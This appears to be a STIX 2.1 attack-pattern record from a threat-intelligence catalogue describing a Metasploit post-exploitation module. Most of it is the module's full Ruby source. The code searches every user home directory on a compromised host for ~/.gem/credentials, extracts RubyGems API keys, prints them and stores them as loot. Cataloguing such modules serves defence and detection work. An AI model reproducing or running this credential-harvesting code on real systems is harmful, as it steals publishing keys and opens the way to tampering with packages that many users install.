{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--edf5f1fc-a0ee-4d4d-9ef4-c8237e01bae6",
    "created": "2024-08-14T16:33:19.177331Z",
    "modified": "2024-08-14T16:33:19.177335Z",
    "name": "Multi Gather RubyGems API Key",
    "description": " This module obtains a user's RubyGems API key from ~/.gem/credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/rubygems_api_key.rb",
            "external_id": "rubygems_api_key.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather RubyGems API Key',\n        'Description' => %q{\n          This module obtains a user's RubyGems API key from ~/.gem/credentials.\n        },\n        'Author' => [\n          'Jonathan Claudius <jclaudius[at]trustwave.com>',\n          'Brandon Myers <bmyers[at]trustwave.com>'\n        ],\n        'Platform' => %w[bsd linux osx unix],\n        'SessionTypes' => %w[shell],\n        'License' => MSF_LICENSE\n      )\n    )\n  end\n\n  def run\n    print_status('Finding ~/.gem/credentials')\n    paths = enum_user_directories.map { |d| d + '/.gem/credentials' }\n    paths = paths.select { |f| file?(f) }\n\n    if paths.empty?\n      print_error('No users found with a ~/.gem/credentials file')\n      return\n    end\n\n    download_key(paths)\n  end\n\n  # Ruby gem credentials are pretty standard and can come\n  # in a few flavors, but the most common are straight yaml\n  # and json, both of which are colon delimited. I suppose\n  # you could concievably have more than one, but that'd be\n  # manually editing, and the first one is probably the best\n  # one anyway.\n  def extract_key(path)\n    data = read_file(path)\n    keys = data.split(':').select { |k| k =~ /[0-9a-f]{32}/ }\n    keys.map(&:strip).first\n  end\n\n  def download_key(paths)\n    print_status(\"Looting #{paths.count} files\")\n    paths.each do |path|\n      path.chomp!\n      next if ['.', '..'].include?(path)\n\n      rubygems_api_key = extract_key(path)\n      next unless rubygems_api_key\n\n      print_good(\"Found a RubyGems API key: #{rubygems_api_key}\")\n\n      loot_path = store_loot(\n        'rubygems.apikey',\n        'text/plain',\n        session,\n        rubygems_api_key,\n        'rubygems_api_key.txt',\n        'RubyGems API key'\n      )\n\n      print_good(\"RubyGems API key stored in #{loot_path}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix]"
    ]
}